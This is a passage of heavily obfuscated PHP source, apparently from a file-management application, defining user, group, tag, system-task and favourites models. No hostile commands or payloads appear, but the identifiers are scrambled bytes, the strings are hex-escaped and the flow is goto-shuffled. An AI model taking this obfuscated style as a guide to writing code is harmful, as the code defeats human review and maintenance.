$aÑ–…ï¥ò± = array(); foreach ($F”Î£»–¤Ã as $fÁĞŒÌñÇ» => $bç÷µ…ŞÔÆ) { $aÑ–…ï¥ò±[] = array($f–¼êÏ„Á«[1423] => $D§„¾„ëâ×, $f–¼êÏ„Á«[2094] => $fÁĞŒÌñÇ», $f–¼êÏ„Á«[2237] => $bç÷µ…ŞÔÆ); } return Model($f–¼êÏ„Á«[2172])->addAll($aÑ–…ï¥ò±, array(), !0); } protected function userGroupRemove($dà¹Š¯ïË¯, $b±Ï…¿”Ó) { $c†º³ª‘âµ =& $_SERVER[í™]; $c®éãİŒ¥Æ = $this->getInfoSimple($dà¹Š¯ïË¯); if (!$c®éãİŒ¥Æ || !$b±Ï…¿”Ó) { return !1; } $aŠïëˆ©š = array($c†º³ª‘âµ[1414] => $dà¹Š¯ïË¯, $c†º³ª‘âµ[2170] => $b±Ï…¿”Ó); return Model($c†º³ª‘âµ[2172])->where($aŠïëˆ©š)->delete(); } public function listData() { $C¼›¡÷Š‡Š = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C¼›¡÷Š‡Š[$_SERVER[í™][354]]); return $C¼›¡÷Š‡Š; } public function listByID($d‘—Âµ·Ô) { $D¿ë¹àë¦ =& $_SERVER[í™]; if (!$d‘—Âµ·Ô) { return; } $D¢È°ˆ•©Ü = array($D¿ë¹àë¦[1423] => array($D¿ë¹àë¦[7], $d‘—Âµ·Ô)); $F©íñ”²Î = $this->where($D¢È°ˆ•©Ü)->select(); $this->_listDataApply($F©íñ”²Î); return $F©íñ”²Î; } public function listByGroup($D¢Æé³Å† = 0, $f «˜°§® = array()) { goto e İè™¬Æ; dÙÓò‘¯ë: if ($D¢Æé³Å†) { $eø¿ŒğÂ˜ = array($cµİœÚÄÏ[2533] => intval($D¢Æé³Å†)); $CîàËÆ÷‡ = "\114\105\106\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\x75\x73\x65\162\x5f\147\162\157\165\160\x20\x75\x73\145\x72\137\147\162\157\x75\x70\x20\157\156\x20\x75\x73\145\x72\56\x75\163\145\162\x49\x44\x20\x3d\40\x75\x73\x65\162\137\147\162\157\x75\x70\56\x75\x73\145\x72\111\104"; $D–†À›ÃÑ¸ = Input::get($cµİœÚÄÏ[407], null, $cµİœÚÄÏ[33]) ? $cµİœÚÄÏ[33] : $cµİœÚÄÏ[2534]; } if (isset($f «˜°§®[$cµİœÚÄÏ[671]])) { $eø¿ŒğÂ˜[$cµİœÚÄÏ[2535]] = $f «˜°§®[$cµİœÚÄÏ[671]]; } $FŒ´½±‡ŒÁ = $this->_makeOrder($D–†À›ÃÑ¸)->field($cµİœÚÄÏ[2536])->where($eø¿ŒğÂ˜)->join($CîàËÆ÷‡)->selectPage(50); goto A¼˜è¦èÍ; e İè™¬Æ: $cµİœÚÄÏ =& $_SERVER[í™]; $CîàËÆ÷‡ = $cµİœÚÄÏ[33]; $eø¿ŒğÂ˜ = array(); goto dÙÓò‘¯ë; A¼˜è¦èÍ: $this->_listDataApply($FŒ´½±‡ŒÁ[$cµİœÚÄÏ[354]]); return $FŒ´½±‡ŒÁ; goto BÁäë´÷ÍÚ; BÁäë´÷ÍÚ: } private function _makeOrder($Cî±ÍÃÙ¿Ğ = '') { goto Eåº›“­²‚; Eåº›“­²‚: $f·›¨ÈÌ¶ =& $_SERVER[í™]; $eÇ œéâÕ = array($f·›¨ÈÌ¶[1423], $f·›¨ÈÌ¶[28], $f·›¨ÈÌ¶[2080], $f·›¨ÈÌ¶[2052], $f·›¨ÈÌ¶[187]); $c½‹¯ŸÃ›Å = array($f·›¨ÈÌ¶[402] => $f·›¨ÈÌ¶[403], $f·›¨ÈÌ¶[404] => $f·›¨ÈÌ¶[405]); goto fŒºÃƒ©µ; fŒºÃƒ©µ: $fĞ±šƒÎË = Input::get($f·›¨ÈÌ¶[407], $f·›¨ÈÌ¶[7], $f·›¨ÈÌ¶[1414], $eÇ œéâÕ); $FÁº¾«çä± = Input::get($f·›¨ÈÌ¶[408], $f·›¨ÈÌ¶[7], $f·›¨ÈÌ¶[2173], array($f·›¨ÈÌ¶[2173], $f·›¨ÈÌ¶[404])); $FÁº¾«çä± = $c½‹¯ŸÃ›Å[$FÁº¾«çä±]; goto bîŠéÖŒöÒ; bîŠéÖŒöÒ: $Cî±ÍÃÙ¿Ğ = $Cî±ÍÃÙ¿Ğ . "\x75\x73\145\162\x2e{$fĞ±šƒÎË}\x20{$FÁº¾«çä±}\54\40\165\163\145\x72\x2e\165\x73\x65\x72\111\104\40\141\x73\x63"; return $this->alias($f·›¨ÈÌ¶[2281])->order($Cî±ÍÃÙ¿Ğ); goto FËËÑ†Å; FËËÑ†Å: } public function listSearch($dÎÙƒ‘£ô) { goto eÚ¿‹ÂËà; eÚ¿‹ÂËà: $Bôé¥ô«¦« =& $_SERVER[í™]; $EÆªà¸‚ê = $dÎÙƒ‘£ô[$Bôé¥ô«¦«[2174]]; $a’Á„ˆÑ = isset($dÎÙƒ‘£ô[$Bôé¥ô«¦«[2175]]) ? $dÎÙƒ‘£ô[$Bôé¥ô«¦«[2175]] : !1; goto dÜ“–‡ùÍŒ; dÜ“–‡ùÍŒ: $EÆªà¸‚ê = str_replace($Bôé¥ô«¦«[2176], $Bôé¥ô«¦«[2177], trim($EÆªà¸‚ê)); $aîäÂ¦…‡ = array($Bôé¥ô«¦«[28] => array($Bôé¥ô«¦«[733], "\x25{$EÆªà¸‚ê}\x25"), $Bôé¥ô«¦«[293] => array($Bôé¥ô«¦«[733], "\45{$EÆªà¸‚ê}\45"), $Bôé¥ô«¦«[2339] => array($Bôé¥ô«¦«[733], "\45{$EÆªà¸‚ê}\x25"), $Bôé¥ô«¦«[899] => $Bôé¥ô«¦«[2178]); if (Input::check($EÆªà¸‚ê, $Bôé¥ô«¦«[299])) { $aîäÂ¦…‡[$Bôé¥ô«¦«[1423]] = array($Bôé¥ô«¦«[733], "\45{$EÆªà¸‚ê}\45"); $aîäÂ¦…‡[$Bôé¥ô«¦«[2517]] = array($Bôé¥ô«¦«[733], "\x25{$EÆªà¸‚ê}\45"); } goto bëÏó‡ßì¢; bëÏó‡ßì¢: if (!$EÆªà¸‚ê) { $aîäÂ¦…‡ = array(); } if (isset($dÎÙƒ‘£ô[$Bôé¥ô«¦«[671]])) { $aîäÂ¦…‡[$Bôé¥ô«¦«[671]] = $dÎÙƒ‘£ô[$Bôé¥ô«¦«[671]]; } $D·š§°µ = $this->_makeOrder()->where($aîäÂ¦…‡)->selectPage(20); goto B±§²±×Ì; B±§²±×Ì: if (!$D·š§°µ || count($D·š§°µ[$Bôé¥ô«¦«[354]]) < 5 && Input::check($EÆªà¸‚ê, $Bôé¥ô«¦«[306])) { $dÑ˜õËó»Ğ = $this->_searchFromMeta($Bôé¥ô«¦«[415], $EÆªà¸‚ê, 10); $F‚£Ğ ¾¿» = $this->_searchFromMeta($Bôé¥ô«¦«[416], $EÆªà¸‚ê, 10); $b¤‚ì‡†Œ× = array_merge($dÑ˜õËó»Ğ, $F‚£Ğ ¾¿», $D·š§°µ[$Bôé¥ô«¦«[354]]); $D·š§°µ[$Bôé¥ô«¦«[354]] = array_unique_by_key($b¤‚ì‡†Œ×, $Bôé¥ô«¦«[1423]); $D·š§°µ[$Bôé¥ô«¦«[351]][$Bôé¥ô«¦«[352]] = count($D·š§°µ[$Bôé¥ô«¦«[354]]); $D·š§°µ[$Bôé¥ô«¦«[351]][$Bôé¥ô«¦«[353]] = ceil($D·š§°µ[$Bôé¥ô«¦«[351]][$Bôé¥ô«¦«[352]] / $D·š§°µ[$Bôé¥ô«¦«[351]][$Bôé¥ô«¦«[349]]); } $this->_listDataApply($D·š§°µ[$Bôé¥ô«¦«[354]]); $this->_filterByGroup($D·š§°µ, $a’Á„ˆÑ); goto B—»¨•½æ×; B—»¨•½æ×: return $D·š§°µ; goto FµĞ«ã¸ƒ; FµĞ«ã¸ƒ: } private function _filterByGroup(&$f‘ØñØ‹Úë, $B±šË•éªÄ) { $bãÓÑ›ƒ¶ =& $_SERVER[í™]; if (!$B±šË•éªÄ) { return $f‘ØñØ‹Úë; } foreach ($f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[354]] as $BŞŸ³¿ã’ø => &$Fî‰Ó½œß) { $AÄñ¦è”ÉŠ = array_to_keyvalue($Fî‰Ó½œß[$bãÓÑ›ƒ¶[2537]], $bãÓÑ›ƒ¶[33], $bãÓÑ›ƒ¶[2094]); if (!in_array($B±šË•éªÄ, $AÄñ¦è”ÉŠ)) { unset($f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[354]][$BŞŸ³¿ã’ø]); } } $f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[354]] = array_values($f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[354]]); $f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[351]] = array($bãÓÑ›ƒ¶[2314] => count($f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[354]]), $bãÓÑ›ƒ¶[2312] => $f‘ØñØ‹Úë[$bãÓÑ›ƒ¶[351]][$bãÓÑ›ƒ¶[349]], $bãÓÑ›ƒ¶[2311] => 1, $bãÓÑ›ƒ¶[2313] => 1); } private function _searchFromMeta($Fğ±šª¤¾, $A®†ã˜ƒ„, $C©šŸİšø‰) { goto E£˜Ú²–ìá; cæõîÙéßÚ: $F…ï‹°ù¬Ã = Model($f¢÷®ÎÍ›„[2538])->where($D¼‹®¥†á)->limit($C©šŸİšø‰)->select(); if (!$F…ï‹°ù¬Ã) { return array(); } $F…ï‹°ù¬Ã = array_to_keyvalue($F…ï‹°ù¬Ã, $f¢÷®ÎÍ›„[33], $f¢÷®ÎÍ›„[1423]); goto b¯ŞÓéÏÌ; E£˜Ú²–ìá: $f¢÷®ÎÍ›„ =& $_SERVER[í™]; $A®†ã˜ƒ„ = strtolower($A®†ã˜ƒ„); $D¼‹®¥†á = array($f¢÷®ÎÍ›„[89] => $Fğ±šª¤¾, $f¢÷®ÎÍ›„[359] => array($f¢÷®ÎÍ›„[733], "\x25{$A®†ã˜ƒ„}\45")); goto cæõîÙéßÚ; b¯ŞÓéÏÌ: $Cæí‚­…®§ = $this->where(array($f¢÷®ÎÍ›„[1414] => array($f¢÷®ÎÍ›„[7], $F…ï‹°ù¬Ã)))->select(); if (!$Cæí‚­…®§) { return array(); } return $Cæí‚­…®§; goto aÃŠŒ¶Ã‘; aÃŠŒ¶Ã‘: } private function _listDataApplyItem($E¶”ØŸ™Áˆ) { $aÈáÀ‘³ù = array($E¶”ØŸ™Áˆ); $this->_listDataApply($aÈáÀ‘³ù); return $aÈáÀ‘³ù[0]; } private function _listDataApply(&$AÎ¿ÕÒ¢­µ) { goto F’Ÿ ¯ŞÉ; Bã­ ‰¹Êˆ: $D¡ªªó•£ê = array_to_keyvalue($AÎ¿ÕÒ¢­µ, $c‰ÈÍÛÔ ¼[33], $c‰ÈÍÛÔ ¼[1423]); $this->_listAppendGroup($AÎ¿ÕÒ¢­µ, $D¡ªªó•£ê); $this->_listAppendMeta($AÎ¿ÕÒ¢­µ, $D¡ªªó•£ê); goto Bîß£÷ÒÛ©; Bîß£÷ÒÛ©: $this->_listAppendSourceRoot($AÎ¿ÕÒ¢­µ, $D¡ªªó•£ê); goto fâˆéò»¾«; F’Ÿ ¯ŞÉ: $c‰ÈÍÛÔ ¼ =& $_SERVER[í™]; if (!$AÎ¿ÕÒ¢­µ) { return; } array_remove_key($AÎ¿ÕÒ¢­µ, $c‰ÈÍÛÔ ¼[787]); goto Bã­ ‰¹Êˆ; fâˆéò»¾«: } private function _listAppendSourceRoot(&$E÷½ÓåøŒé, $bÚ›‚ñ¶) { goto E‰˜×ƒãß; cÈ–¦¡©Ş: foreach ($E÷½ÓåøŒé as &$eÏçîŒÅí¿) { $eÏçîŒÅí¿[$d• ‚Â­¬°[391]] = $B†“Â‚Ë•”[$eÏçîŒÅí¿[$d• ‚Â­¬°[1423]]] ? $B†“Â‚Ë•”[$eÏçîŒÅí¿[$d• ‚Â­¬°[1423]]] : array(); } goto D°¼×±¢Ï; E‰˜×ƒãß: $d• ‚Â­¬° =& $_SERVER[í™]; $f½õŒ’ = array($d• ‚Â­¬°[463] => 0, $d• ‚Â­¬°[371] => SourceModel::TYPE_USER, $d• ‚Â­¬°[458] => array($d• ‚Â­¬°[7], $bÚ›‚ñ¶)); $Fò±´é = $d• ‚Â­¬°[2185]; goto f›Ş«Òéø; f›Ş«Òéø: $B†“Â‚Ë•” = Model($d• ‚Â­¬°[734])->order($d• ‚Â­¬°[2186])->field($Fò±´é)->where($f½õŒ’)->select(); $B†“Â‚Ë•” = array_to_keyvalue($B†“Â‚Ë•”, $d• ‚Â­¬°[458]); $B†“Â‚Ë•” = array_remove_key($B†“Â‚Ë•”, $d• ‚Â­¬°[458]); goto cÈ–¦¡©Ş; D°¼×±¢Ï: } private function _listAppendGroup(&$D½‰‰èòÔ™, $C†ÕÊ˜çÔ) { goto EŞÁò÷àà; f‹ÑÈøŸ„Å: $C÷¸¯ƒ„ôô = array_to_keyvalue_group($C÷¸¯ƒ„ôô, $aëÃàÜÀ”[1423]); foreach ($C÷¸¯ƒ„ôô as &$fŒìÚÙ²ŠË) { $Aâ‚æ  ºŠ = array(); foreach ($fŒìÚÙ²ŠË as $aŠ·õóááÙ) { if (!$aŠ·õóááÙ[$aëÃàÜÀ”[2237]]) { continue; } $CòĞ«åï¤õ = Model($aëÃàÜÀ”[2256])->listData($aŠ·õóááÙ[$aëÃàÜÀ”[2237]]); $Aâ‚æ  ºŠ[] = array($aëÃàÜÀ”[2094] => $aŠ·õóááÙ[$aëÃàÜÀ”[2094]], $aëÃàÜÀ”[2541] => $e±°¸ßÓÜÓ[$aŠ·õóááÙ[$aëÃàÜÀ”[2094]]][$aëÃàÜÀ”[28]], $aëÃàÜÀ”[461] => $e±°¸ßÓÜÓ[$aŠ·õóááÙ[$aëÃàÜÀ”[2094]]][$aëÃàÜÀ”[461]], $aëÃàÜÀ”[376] => $CòĞ«åï¤õ); } $fŒìÚÙ²ŠË = $Aâ‚æ  ºŠ; } foreach ($D½‰‰èòÔ™ as &$DÃâÈÂ) { $DÃâÈÂ[$aëÃàÜÀ”[2537]] = array(); if (isset($C÷¸¯ƒ„ôô[$DÃâÈÂ[$aëÃàÜÀ”[1423]]])) { $DÃâÈÂ[$aëÃàÜÀ”[2537]] = $C÷¸¯ƒ„ôô[$DÃâÈÂ[$aëÃàÜÀ”[1423]]]; } } goto EîÄ†îñ¯ˆ; EŞÁò÷àà: $aëÃàÜÀ” =& $_SERVER[í™]; $b½­¿Ÿ“ò‡ = array($aëÃàÜÀ”[1423] => array($aëÃàÜÀ”[7], $C†ÕÊ˜çÔ)); $C÷¸¯ƒ„ôô = Model($aëÃàÜÀ”[2172])->where($b½­¿Ÿ“ò‡)->select(); goto EÃÙ´–Îäö; dĞ½ËÉ¯Ê: $b½­¿Ÿ“ò‡ = array($aëÃàÜÀ”[2094] => array($aëÃàÜÀ”[7], $aˆ…ÀóÒÈº)); $e±°¸ßÓÜÓ = Model($aëÃàÜÀ”[2539])->field($aëÃàÜÀ”[2540])->where($b½­¿Ÿ“ò‡)->select(); $e±°¸ßÓÜÓ = array_to_keyvalue($e±°¸ßÓÜÓ, $aëÃàÜÀ”[2094]); goto f‹ÑÈøŸ„Å; EÃÙ´–Îäö: $aˆ…ÀóÒÈº = array_to_keyvalue($C÷¸¯ƒ„ôô, $aëÃàÜÀ”[33], $aëÃàÜÀ”[2094]); $aˆ…ÀóÒÈº = array_remove_value(array_unique($aˆ…ÀóÒÈº), $aëÃàÜÀ”[470]); if (!$aˆ…ÀóÒÈº || !$C÷¸¯ƒ„ôô) { return; } goto dĞ½ËÉ¯Ê; EîÄ†îñ¯ˆ: } private function _listAppendMeta(&$dÀŞÒø‚Ÿ, $E£‹™ßïÑØ) { goto eÏÛï³éòˆ; eÏÛï³éòˆ: $bµ¡º™Ù£ =& $_SERVER[í™]; $FâÎÓ•§Õ = UserJobModel::JOB_KEY; $c›Ã÷†ĞÈ = array($bµ¡º™Ù£[2519]); goto EÔôœÌÅ; EÔôœÌÅ: $FãÛ ¯è› = array($bµ¡º™Ù£[1423] => array($bµ¡º™Ù£[7], $E£‹™ßïÑØ)); $AëÙ¸°ÓÔ = Model($bµ¡º™Ù£[2516])->where($FãÛ ¯è›)->select(); $AëÙ¸°ÓÔ = array_to_keyvalue_group($AëÙ¸°ÓÔ, $bµ¡º™Ù£[1423]); goto B®¤í†¥ÖÍ; B®¤í†¥ÖÍ: foreach ($AëÙ¸°ÓÔ as &$EÂ™àô˜–) { $d—ÒîÍˆïù = array(); foreach ($EÂ™àô˜– as $CîêÏŒÅØñ) { if (!in_array($CîêÏŒÅØñ[$bµ¡º™Ù£[89]], $c›Ã÷†ĞÈ)) { $d—ÒîÍˆïù[$CîêÏŒÅØñ[$bµ¡º™Ù£[89]]] = $CîêÏŒÅØñ[$bµ¡º™Ù£[359]]; } } $EÂ™àô˜– = $d—ÒîÍˆïù; } $d’ÈäõòÕ² = Model($bµ¡º™Ù£[2542]); foreach ($dÀŞÒø‚Ÿ as &$a¢æØÍĞß) { $c·ëùËÕ»Î = array(); if (isset($AëÙ¸°ÓÔ[$a¢æØÍĞß[$bµ¡º™Ù£[1423]]])) { $c·ëùËÕ»Î = $AëÙ¸°ÓÔ[$a¢æØÍĞß[$bµ¡º™Ù£[1423]]]; } $a¢æØÍĞß[$bµ¡º™Ù£[2543]] = array(); if (isset($c·ëùËÕ»Î[$FâÎÓ•§Õ])) { $a¢æØÍĞß[$bµ¡º™Ù£[2543]] = $d’ÈäõòÕ²->getUserJobInfo($c·ëùËÕ»Î[$FâÎÓ•§Õ]); } } goto b’Ê›ï; b’Ê›ï: } protected function groupUserAll($BÓ­Ëİ’¯Ş) { $cÆ‚¾¿®­  =& $_SERVER[í™]; if (!$BÓ­Ëİ’¯Ş) { return !1; } $F‚·êä…õ² = Model($cÆ‚¾¿®­ [2172])->field($cÆ‚¾¿®­ [1423])->where(array($cÆ‚¾¿®­ [2094] => array($cÆ‚¾¿®­ [7], $BÓ­Ëİ’¯Ş)))->select(); $F‚·êä…õ² = array_to_keyvalue($F‚·êä…õ², $cÆ‚¾¿®­ [33], $cÆ‚¾¿®­ [1423]); return array_unique($F‚·êä…õ²); } public function userSearch($dÇ´‚Ÿ¯¡¨, $A¢²œĞ‹© = "\x2a") { return Model($_SERVER[í™][479])->where($dÇ´‚Ÿ¯¡¨)->field($A¢²œĞ‹©)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($B’Í¼„æ¿) { $bŒÉõœå =& $_SERVER[í™]; if (!defined($bŒÉõœå[427])) { define($bŒÉõœå[427], 0); } return "\x55\163\x65\162\x4f\160\164\x69\157\156\137{$B’Í¼„æ¿}\x5f" . USER_ID; } protected function filterWhere($fòø–šâô) { $a¹÷õ—§  =& $_SERVER[í™]; if (!defined($a¹÷õ—§ [427])) { define($a¹÷õ—§ [427], 0); } $fòø–šâô[$a¹÷õ—§ [1423]] = USER_ID; return $fòø–šâô; } public function cacheRemoveUser($aêŸŠĞŸ‚, $f¨ë‡Œñ´„) { return Cache::remove("\x55\x73\145\x72\117\x70\164\x69\x6f\x6e\x5f{$aêŸŠĞŸ‚}\137" . $f¨ë‡Œñ´„); } protected function optionDefault($A÷‹‘»õİ¡ = '') { $a„öï«ÙË— =& $_SERVER[í™]; if ($A÷‹‘»õİ¡ == $a„öï«ÙË—[33]) { return $GLOBALS[$a„öï«ÙË—[6]][$a„öï«ÙË—[2544]]; } if ($A÷‹‘»õİ¡ == $a„öï«ÙË—[2545]) { return $GLOBALS[$a„öï«ÙË—[6]][$a„öï«ÙË—[2546]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\164\x61\x67\x4c\x69\x73\164"; public $modelType = "\125\x73\x65\x72\x4f\160\x74\x69\x6f\156"; public $field = array("\156\x61\155\x65", "\x73\x74\x79\x6c\x65", "\x73\157\162\164"); public function listData($eìŒêëÍÖ = false, $AìÉŠÈ³«Ï = "\x73\x6f\162\x74", $dæ±Ë“Ö‰İ = false) { return parent::listData($eìŒêëÍÖ, $AìÉŠÈ³«Ï, $dæ±Ë“Ö‰İ); } public function remove($eêÊë¦İ¦Å) { return parent::remove($eêÊë¦İ¦Å); } public function add($c†–¸åù¿ñ, $CæˆÕ«¬ë£ = "\x6c\141\x62\145\x6c\55\147\162\145\171\x2d\156\x6f\x72\x6d\141\154") { $aÓÙƒ”¬£‘ =& $_SERVER[í™]; if ($this->findByName($c†–¸åù¿ñ)) { return !1; } $CÒƒßÀ‚ë = array($aÓÙƒ”¬£‘[386] => $c†–¸åù¿ñ, $aÓÙƒ”¬£‘[437] => $CæˆÕ«¬ë£, $aÓÙƒ”¬£‘[2098] => $this->getSort($aÓÙƒ”¬£‘[246]) + 1); return parent::insert($CÒƒßÀ‚ë); } public function update($DŞÖóæÉ„, $c¤‚³†²ˆ…) { $eÏîéŒàéØ =& $_SERVER[í™]; $BáÑÂèî = $this->listData($DŞÖóæÉ„); $A¦áë‡§ô‚ = $this->findByName($c¤‚³†²ˆ…[$eÏîéŒàéØ[28]]); if (!$BáÑÂèî || $A¦áë‡§ô‚ && $A¦áë‡§ô‚[$eÏîéŒàéØ[367]] != $BáÑÂèî[$eÏîéŒàéØ[367]]) { return !1; } return parent::update($DŞÖóæÉ„, $c¤‚³†²ˆ…); } public function moveTop($cæè†áñâ) { $C¦íæ›ÄÂò =& $_SERVER[í™]; $Dˆ“®‘¦Ú£ = parent::listData(); $dáÅ…‡Â„í = $this->getSort($C¦íæ›ÄÂò[245]); foreach ($Dˆ“®‘¦Ú£ as &$CÂŒ¦Ø™ì) { if ($CÂŒ¦Ø™ì[$C¦íæ›ÄÂò[367]] == $cæè†áñâ) { $CÂŒ¦Ø™ì[$C¦íæ›ÄÂò[2115]] = $dáÅ…‡Â„í; continue; } $CÂŒ¦Ø™ì[$C¦íæ›ÄÂò[2115]] += 1; } return parent::resetData($Dˆ“®‘¦Ú£); } public function moveBottom($B­Ëç‹âô­) { $B÷›©÷†½  =& $_SERVER[í™]; $e¾Õª°Ì„ = $this->getSort($B÷›©÷†½ [246]) + 1; return parent::update($B­Ëç‹âô­, array($B÷›©÷†½ [2115] => $e¾Õª°Ì„)); } public function resetSort($fèóƒñĞÉÖ) { goto AÖ¯ç¹Ó›; b„ŒİÌÓ: return parent::resetData($E‰»»æï); goto c™Ô¤”™ŠË; AÖ¯ç¹Ó›: $Fá»İ´Á˜Ç =& $_SERVER[í™]; $aÙÉÚ’­»” = array(); $fèóƒñĞÉÖ = is_array($fèóƒñĞÉÖ) ? $fèóƒñĞÉÖ : array(); goto cİ’¡ùæí; cİ’¡ùæí: for ($aÎ÷éø†â = 0; $aÎ÷éø†â < count($fèóƒñĞÉÖ); $aÎ÷éø†â++) { $aÙÉÚ’­»”[$fèóƒñĞÉÖ[$aÎ÷éø†â] . $Fá»İ´Á˜Ç[33]] = $aÎ÷éø†â + 1; } $E‰»»æï = parent::listData(); foreach ($E‰»»æï as &$F¸òáš¹Ä) { $c–‘‰…¨¾ = $aÙÉÚ’­»”[$F¸òáš¹Ä[$Fá»İ´Á˜Ç[367]]]; $F¸òáš¹Ä[$Fá»İ´Á˜Ç[2115]] = $c–‘‰…¨¾ ? $c–‘‰…¨¾ : $F¸òáš¹Ä[$Fá»İ´Á˜Ç[2115]]; } goto b„ŒİÌÓ; c™Ô¤”™ŠË: } private function getSort($Eäç®‡ó§À) { $B•‘½¿ÑæÊ =& $_SERVER[í™]; $bå©˜”£ñ© = parent::listData(); $B§Š¿Ê˜ƒ÷ = array_to_keyvalue($bå©˜”£ñ©, $B•‘½¿ÑæÊ[33], $B•‘½¿ÑæÊ[2115]); if (!$B§Š¿Ê˜ƒ÷) { $B§Š¿Ê˜ƒ÷ = array(0); } $FÒíö–³²á = $Eäç®‡ó§À == $B•‘½¿ÑæÊ[246] ? max($B§Š¿Ê˜ƒ÷) : min($B§Š¿Ê˜ƒ÷); return intval($FÒíö–³²á); } } goto BƒëƒÎ°ÑÕ; dĞ»´ğ¶Ë: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x74\141\163\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x74\171\160\x65", "\x65\166\x65\x6e\164", "\164\x69\x6d\x65", "\x64\145\163\143", "\163\171\x73\164\x65\155", "\x65\156\x61\x62\x6c\x65", "\x6c\x61\x73\x74\x52\165\x6e", "\x73\157\x72\x74"); public function listData($dˆà½ØÀ±‹ = false, $AÕìÄ£ëâ = "\163\157\162\164", $fÈã“‘’¬º = false) { return parent::listData($dˆà½ØÀ±‹, $AÕìÄ£ëâ, $fÈã“‘’¬º); } public function add($fÎÂÄçÆ£ø) { $D·—†ÎéªÏ =& $_SERVER[í™]; $c¥ÛÛØà± = $this->findByName($fÎÂÄçÆ£ø[$D·—†ÎéªÏ[28]]); if ($c¥ÛÛØà±) { return !1; } $fÎÂÄçÆ£ø[$D·—†ÎéªÏ[1388]] = 0; $fÎÂÄçÆ£ø[$D·—†ÎéªÏ[2115]] = $this->getSort(); return parent::insert($fÎÂÄçÆ£ø); } private function getSort() { $fñš ñ§×Ô =& $_SERVER[í™]; $CîÂ®«Ôƒä = parent::listData(); $bø°”±Ó = array_to_keyvalue($CîÂ®«Ôƒä, $fñš ñ§×Ô[33], $fñš ñ§×Ô[2115]); return empty($bø°”±Ó) ? 0 : max($bø°”±Ó) + 1; } public function update($Bó‰¼Ä„¶ß, $c÷¡†Å“) { $FÙ¤ìÆÃÌ¨ =& $_SERVER[í™]; $B²øÄ·¡ö = $this->listData($Bó‰¼Ä„¶ß); $a‘ÅÜåØ¼µ = $this->findByName($c÷¡†Å“[$FÙ¤ìÆÃÌ¨[28]]); if (!$B²øÄ·¡ö || $a‘ÅÜåØ¼µ && $a‘ÅÜåØ¼µ[$FÙ¤ìÆÃÌ¨[367]] != $B²øÄ·¡ö[$FÙ¤ìÆÃÌ¨[367]]) { return !1; } return parent::update($Bó‰¼Ä„¶ß, $c÷¡†Å“); } public function remove($CÃíí¢ªÕÕ, $eò½ËºÛ¶Ğ = false) { $c²Äµ¹º¶ =& $_SERVER[í™]; $E—ÏßøŒÏÄ = $this->listData($CÃíí¢ªÕÕ); if (!$E—ÏßøŒÏÄ) { return; } if (!$eò½ËºÛ¶Ğ && $E—ÏßøŒÏÄ[$c²Äµ¹º¶[1066]] == $c²Äµ¹º¶[83]) { return !1; } return parent::remove($CÃíí¢ªÕÕ); } public function enable($FĞÔÌÉ¼ñÃ, $DÁÄÂÀ¤Ü†) { return $this->update($FĞÔÌÉ¼ñÃ, array($_SERVER[í™][2480] => $DÁÄÂÀ¤Ü†)); } public function run($bÅ’·Æ·±İ) { return $this->update($bÅ’·Æ·±İ, array($_SERVER[í™][2492] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($DäÊ­ìæäƒ) { $b¼âÄĞ×‡ =& $_SERVER[í™]; return array($b¼âÄĞ×‡[2189] => array(USER_ID, $b¼âÄĞ×‡[2493])); } protected function listData() { $a‚ÜÅ¯‹æ‡ =& $_SERVER[í™]; $fŒÙñ’óÀ = array($a‚ÜÅ¯‹æ‡[1414] => USER_ID, $a‚ÜÅ¯‹æ‡[436] => 0); $A·ïöÚšğÙ = $a‚ÜÅ¯‹æ‡[2494]; $A„ÚÃ„Óî¿ = $this->field($A·ïöÚšğÙ)->where($fŒÙñ’óÀ)->order($a‚ÜÅ¯‹æ‡[2495])->select(); return $A„ÚÃ„Óî¿ ? $A„ÚÃ„Óî¿ : array(); } protected function resetCache() { } protected function listView() { goto e–»½ƒŠ¦‘; díäôˆö¶ï: $CªÑˆåĞ•Í = array($d¤Ô¿ôÜ“ˆ[383] => array($d¤Ô¿ôÜ“ˆ[384], $Fò¡‰š¿Øñ)); $AÔ´ãÁ¨»é = Model($d¤Ô¿ôÜ“ˆ[734])->listSource($CªÑˆåĞ•Í, $B·¾Ú¥§‹º); $AÔ´ãÁ¨»é = array_merge($AÔ´ãÁ¨»é[$d¤Ô¿ôÜ“ˆ[73]], $AÔ´ãÁ¨»é[$d¤Ô¿ôÜ“ˆ[74]]); goto Bâ·ßÊô’; e–»½ƒŠ¦‘: $d¤Ô¿ôÜ“ˆ =& $_SERVER[í™]; $dĞõ®ˆÉ¯ = $this->listData(); $E¾˜î„°í = array_filter_by_field($dĞõ®ˆÉ¯, $d¤Ô¿ôÜ“ˆ[29], $d¤Ô¿ôÜ“ˆ[382]); goto Cğ»Ùç±’“; Cğ»Ùç±’“: $Fò¡‰š¿Øñ = array_to_keyvalue($E¾˜î„°í, $d¤Ô¿ôÜ“ˆ[33], $d¤Ô¿ôÜ“ˆ[75]); if (!$Fò¡‰š¿Øñ) { return $dĞõ®ˆÉ¯; } $B·¾Ú¥§‹º = 2000; goto díäôˆö¶ï; Bâ·ßÊô’: $AÔ´ãÁ¨»é = array_to_keyvalue($AÔ´ãÁ¨»é, $d¤Ô¿ôÜ“ˆ[369]); foreach ($dĞõ®ˆÉ¯ as $b†Ü¹Š‘Ë© => $FÓ£ ­±„) { $C–ò³Ô¬†è = $AÔ´ãÁ¨»é[$FÓ£ ­±„[$d¤Ô¿ôÜ“ˆ[75]]]; $C–ò³Ô¬†è = $C–ò³Ô¬†è ? $C–ò³Ô¬†è : array(); $dĞõ®ˆÉ¯[$b†Ü¹Š‘Ë©] = 